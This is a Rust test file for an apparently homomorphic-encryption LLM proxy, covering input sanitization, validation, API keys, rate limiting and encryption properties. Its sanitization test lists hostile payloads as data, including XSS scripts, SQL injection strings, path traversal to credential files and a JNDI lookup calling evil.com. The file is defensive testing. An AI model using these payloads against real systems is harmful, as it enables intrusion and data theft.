//! Comprehensive security tests for FHE LLM Proxy

use homomorphic_llm_proxy::fhe::{FheEngine, FheParams};
use homomorphic_llm_proxy::security::{
    AdaptiveRateLimiter, ApiKeyManager, ContentSecurityPolicy, InputValidator, Permission,
    SecurityAuditor, SecurityMetrics,
};
use std::time::Duration;
use uuid::Uuid;

#[tokio::test]
async fn test_input_sanitization_comprehensive() {
    // Test various injection attack patterns
    let malicious_inputs = vec![
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "1' OR 1=1 --",
        "UNION SELECT * FROM users--",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<img src=x onerror=alert('XSS')>",
        "vbscript:alert('XSS')",
        "data:application/javascript,alert('XSS')",
        "\x00\x01\x02\x03", // Control characters
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    ];

    for input in malicious_inputs {
        let result = InputValidator::sanitize_text(input);
        
        match result {
            Ok(sanitized) => {
                // If sanitization succeeds, ensure no malicious patterns remain
                let sanitized_lower = sanitized.to_lowercase();
                assert!(!sanitized_lower.contains("script"));
                assert!(!sanitized_lower.contains("javascript"));
                assert!(!sanitized_lower.contains("drop table"));
                assert!(!sanitized_lower.contains("union select"));
                println!("✓ Sanitized: '{}' -> '{}'", input, sanitized);
            }
            Err(_) => {
                // Rejection is also acceptable for malicious input
                println!("✓ Rejected malicious input: '{}'", input);
            }
        }
    }
}

#[test]
fn test_uuid_validation_security() {
    // Valid UUIDs
    let valid_uuids = vec![
        "550e8400-e29b-41d4-a716-446655440000",
        "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
        "f47ac10b-58cc-4372-a567-0e02b2c3d479",
    ];

    for uuid in valid_uuids {
        assert!(InputValidator::validate_uuid(uuid).is_ok());
    }

    // Invalid/malicious UUID attempts
    let invalid_uuids = vec![
        "not-a-uuid",
        "550e8400-e29b-41d4-a716", // Too short
        "550e8400-e29b-41d4-a716-446655440000-extra", // Too long
        "../etc/passwd",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "550e8400-e29b-41d4-a716-44665544000g", // Invalid character
        "",
        "00000000-0000-0000-0000-000000000000", // Nil UUID
    ];

    for uuid in invalid_uuids {
        assert!(InputValidator::validate_uuid(uuid).is_err());
    }
}

#[test]
fn test_fhe_params_validation_security() {
    // Valid parameters
    assert!(InputValidator::validate_fhe_params(16384, 128).is_ok());
    assert!(InputValidator::validate_fhe_params(32768, 192).is_ok());

    // Invalid parameters that could cause security issues
    let invalid_params = vec![
        (1, 128),      // Too small
        (15000, 128),  // Not power of 2
        (16384, 64),   // Security too low
        (16384, 256),  // Unsupported security level
        (0, 128),      // Zero value
        (1 << 20, 128), // Too large
    ];

    for (poly_degree, security) in invalid_params {
        assert!(InputValidator::validate_fhe_params(poly_degree, security).is_err());
    }
}

#[test]
fn test_content_security_policy() {
    let default_policy = ContentSecurityPolicy::default_policy();
    let api_policy = ContentSecurityPolicy::api_policy();

    // Check that policies contain expected security directives
    assert!(default_policy.contains("default-src 'self'"));
    assert!(default_policy.contains("object-src 'none'"));
    assert!(default_policy.contains("base-uri 'self'"));

    assert!(api_policy.contains("default-src 'none'"));
    assert!(api_policy.contains("connect-src 'self'"));

    println!("Default CSP: {}", default_policy);
    println!("API CSP: {}", api_policy);
}

#[tokio::test]
async fn test_api_key_security() {
    let master_secret = "very-secure-master-secret-key-for-testing".to_string();
    let mut manager = ApiKeyManager::new(master_secret);

    // Generate multiple API keys
    let permissions = vec![Permission::Encrypt, Permission::Decrypt];
    let api_key1 = manager.generate_api_key("user1".to_string(), permissions.clone());
    let api_key2 = manager.generate_api_key("user2".to_string(), permissions.clone());

    // Keys should be unique
    assert_ne!(api_key1, api_key2);
    assert!(api_key1.len() > 20);
    assert!(api_key2.len() > 20);

    // Test key validation
    assert!(manager.validate_api_key(&api_key1).is_ok());
    assert!(manager.validate_api_key(&api_key2).is_ok());

    // Test permission checking
    assert!(manager.has_permission(&api_key1, &Permission::Encrypt));
    assert!(!manager.has_permission(&api_key1, &Permission::Admin));

    // Test key revocation
    assert!(manager.revoke_api_key(&api_key1).is_ok());
    assert!(manager.validate_api_key(&api_key1).is_err());

    // Test brute force protection - attempt with many invalid keys
    for _ in 0..100 {
        let fake_key = format!("fake_key_{}", Uuid::new_v4());
        assert!(manager.validate_api_key(&fake_key).is_err());
    }

    // Original valid key should still work
    assert!(manager.validate_api_key(&api_key2).is_ok());
}

#[tokio::test]
async fn test_adaptive_rate_limiting_security() {
    let mut limiter = AdaptiveRateLimiter::new(100.0, 1.0); // Low limits for testing
    let attacker_ip = "192.168.1.66";
    let normal_ip = "192.168.1.100";

    // Normal usage should work
    assert!(limiter.check_request(normal_ip, 1.0).unwrap());

    // Simulate attack - rapid requests from one IP
    let mut blocked_count = 0;
    for i in 0..200 {
        if !limiter.check_request(attacker_ip, 1.0).unwrap() {
            blocked_count += 1;
        }
        
        // After enough violations, should be blocked
        if i > 150 {
            assert!(!limiter.check_request(attacker_ip, 1.0).unwrap());
        }
    }

    println!("Blocked {} requests from attacker IP", blocked_count);
    assert!(blocked_count > 0);

    // Normal IP should still work (not affected by other IP's violations)
    assert!(limiter.check_request(normal_ip, 1.0).unwrap());

    // Test security metrics
    let metrics = limiter.get_security_metrics();
    assert!(metrics.total_tracked_ips >= 2);
    assert!(metrics.currently_blocked_ips > 0);

    println!("Security metrics: {:?}", metrics);
}

#[tokio::test]
async fn test_emergency_lockdown() {
    let mut limiter = AdaptiveRateLimiter::new(1000.0, 10.0);
    let test_ip = "192.168.1.200";

    // Normal operation
    assert!(limiter.check_request(test_ip, 1.0).unwrap());

    // Trigger emergency lockdown
    limiter.enable_emergency_lockdown(Duration::from_secs(1));

    // Should block all requests during lockdown
    assert!(!limiter.check_request(test_ip, 1.0).unwrap());
    assert!(!limiter.check_request("192.168.1.201", 1.0).unwrap());

    // Wait for lockdown to expire
    tokio::time::sleep(Duration::from_millis(1100)).await;

    // Should allow requests again (in real implementation)
    println!("Emergency lockdown test completed");
}

#[tokio::test]
async fn test_encryption_security_properties() {
    let params = FheParams::default();
    let mut engine = FheEngine::new(params).expect("Failed to create FHE engine");
    let (client_id, _) = engine.generate_keys().expect("Failed to generate keys");

    let plaintext = "Sensitive data that should be encrypted";

    // Test that encryption produces different outputs for same input
    let ciphertext1 = engine.encrypt_text(client_id, plaintext).unwrap();
    let ciphertext2 = engine.encrypt_text(client_id, plaintext).unwrap();

    // Ciphertexts should be different (probabilistic encryption)
    assert_ne!(ciphertext1.data, ciphertext2.data);
    assert_ne!(ciphertext1.id, ciphertext2.id);

    // Both should decrypt to same plaintext
    let decrypted1 = engine.decrypt_text_safe(client_id, &ciphertext1).unwrap();
    let decrypted2 = engine.decrypt_text_safe(client_id, &ciphertext2).unwrap();
    assert_eq!(decrypted1, plaintext);
    assert_eq!(decrypted2, plaintext);

    // Test cross-client security - different client shouldn't decrypt
    let (other_client_id, _) = engine.generate_keys().unwrap();
    let cross_decrypt_result = engine.decrypt_text_safe(other_client_id, &ciphertext1);
    assert!(cross_decrypt_result.is_err(), "Different client should not decrypt");

    // Test ciphertext validation
    assert!(engine.validate_ciphertext(&ciphertext1).unwrap());

    // Test tampered ciphertext detection
    let mut tampered_ciphertext = ciphertext1.clone();
    if !tampered_ciphertext.data.is_empty() {
        tampered_ciphertext.data[0] ^= 0xFF; // Flip bits
        
        // Validation should fail or decryption should fail
        let validation_result = engine.validate_ciphertext(&tampered_ciphertext);
        let decryption_result = engine.decrypt_text_safe(client_id, &tampered_ciphertext);
        
        assert!(validation_result.is_err() || decryption_result.is_err(),
                "Tampered ciphertext should be detected");
    }
}

#[tokio::test]
async fn test_noise_budget_security() {
    let params = FheParams::default();
    let mut engine = FheEngine::new(params).expect("Failed to create FHE engine");
    let (client_id, _) = engine.generate_keys().expect("Failed to generate keys");

    let plaintext = "Test noise budget security";
    let ciphertext = engine.encrypt_text(client_id, plaintext).unwrap();

    // Initial noise budget should be reasonable
    assert!(ciphertext.noise_budget.is_some());
    let initial_budget = ciphertext.noise_budget.unwrap();
    assert!(initial_budget > 10); // Should have sufficient budget

    // Test homomorphic operations impact on noise budget
    let processed_ciphertext = engine.process_encrypted_prompt(&ciphertext).unwrap();
    
    if let Some(processed_budget) = processed_ciphertext.noise_budget {
        assert!(processed_budget <= initial_budget, "Noise budget should decrease after operations");
    }

    // Test concatenation impact
    let ciphertext2 = engine.encrypt_text(client_id, " additional").unwrap();
    let concatenated = engine.concatenate_encrypted(&ciphertext, &ciphertext2).unwrap();
    
    if let Some(concat_budget) = concatenated.noise_budget {
        assert!(concat_budget > 0, "Should still have some noise budget");
    }
}

#[test]
fn test_security_auditor() {
    // Test security event logging (in real implementation, would check log output)
    SecurityAuditor::log_auth_event("login", "testuser", "192.168.1.100", true);
    SecurityAuditor::log_auth_event("login", "baduser", "192.168.1.200", false);
    
    SecurityAuditor::log_data_access("encrypt", "testuser", "data123", "192.168.1.100");
    SecurityAuditor::log_security_violation("rate_limit", "Too many requests", "192.168.1.200");
    SecurityAuditor::log_privilege_escalation("testuser", "admin", "192.168.1.100");

    // In a real implementation, we would verify that these events are properly logged
    // and that they contain the correct security-relevant information
    println!("Security audit events logged successfully");
}

#[tokio::test]
async fn test_side_channel_resistance() {
    let params = FheParams::default();
    let mut engine = FheEngine::new(params).expect("Failed to create FHE engine");
    let (client_id, _) = engine.generate_keys().expect("Failed to generate keys");

    // Test timing attack resistance by measuring encryption times
    let test_messages = vec![
        "a",
        "short message",
        "this is a much longer message that should not reveal timing information",
        "x".repeat(1000),
    ];

    let mut encryption_times = Vec::new();

    for message in test_messages {
        let start = std::time::Instant::now();
        let _ciphertext = engine.encrypt_text(client_id, &message).unwrap();
        let duration = start.elapsed();
        encryption_times.push(duration);
        
        println!("Message length: {}, Encryption time: {:?}", message.len(), duration);
    }

    // In a production system, you would want timing to be more consistent
    // For this test, we just verify that encryption completes for all inputs
    assert_eq!(encryption_times.len(), 4);
    
    // All operations should complete in reasonable time
    for time in encryption_times {
        assert!(time < Duration::from_secs(1), "Encryption should complete quickly");
    }
}